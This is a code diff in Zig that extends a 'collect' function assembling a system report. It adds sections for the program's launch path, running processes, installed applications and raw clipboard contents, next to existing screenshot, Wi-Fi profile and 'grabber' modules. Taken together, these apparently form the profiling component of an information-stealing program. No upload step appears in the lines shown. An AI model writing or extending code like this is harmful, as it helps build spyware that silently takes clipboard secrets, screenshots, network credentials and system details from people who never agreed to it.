@@ -5,11 +5,23 @@ const network_info = @import("network_info.zig");
 const wifi = @import("wifi.zig");
 const screenshot = @import("screenshot.zig");
 const grabber = @import("grabber.zig");
+const processes = @import("processes.zig");
+const applications = @import("applications.zig");
+const clipboard = @import("clipboard.zig");
+const launch_info = @import("launch_info.zig");
 
 pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
     var report = std.ArrayList(u8).init(allocator);
     errdefer report.deinit();
     const w = report.writer();
+
+    try w.print("=== Launch Info ===\n", .{});
+    if (launch_info.collect(allocator)) |li| {
+        defer allocator.free(li.exe_path);
+        try w.print("Path: {s}\nOn Disk: {}\n\n", .{ li.exe_path, li.is_disk });
+    } else |e| {
+        try w.print("Failed: {}\n\n", .{e});
+    }
 
     try w.print("=== OS Information ===\n", .{});
     {
@@ -36,6 +48,56 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
         };
         defer allocator.free(net);
         try w.print("{s}\n\n", .{net});
+    }
+
+    try w.print("=== Processes ===\n", .{});
+    if (processes.collect(allocator)) |list| {
+        defer {
+            for (list) |entry| allocator.free(entry.name);
+            allocator.free(list);
+        }
+        for (list) |entry| {
+            try w.print("  {} - {s}\n", .{ entry.pid, entry.name });
+        }
+        try w.print("\n", .{});
+    } else |e| {
+        try w.print("Failed: {}\n\n", .{e});
+    }
+
+    try w.print("=== Applications ===\n", .{});
+    if (applications.collect(allocator)) |list| {
+        defer {
+            for (list) |app| {
+                allocator.free(app.name);
+                allocator.free(app.version);
+            }
+            allocator.free(list);
+        }
+        for (list) |app| {
+            if (app.version.len > 0) {
+                try w.print("  {s} ({s})\n", .{ app.name, app.version });
+            } else {
+                try w.print("  {s}\n", .{app.name});
+            }
+        }
+        try w.print("\n", .{});
+    } else |e| {
+        try w.print("Failed: {}\n\n", .{e});
+    }
+
+    try w.print("=== Clipboard ===\n", .{});
+    {
+        const text = clipboard.capture(allocator);
+        if (text) |t| {
+            defer allocator.free(t);
+            if (t.len > 0) {
+                try w.print("{s}\n\n", .{t});
+            } else {
+                try w.print("[empty]\n\n", .{});
+            }
+        } else {
+            try w.print("[unavailable]\n\n", .{});
+        }
     }
 
     try w.print("=== WiFi Profiles ===\n", .{});
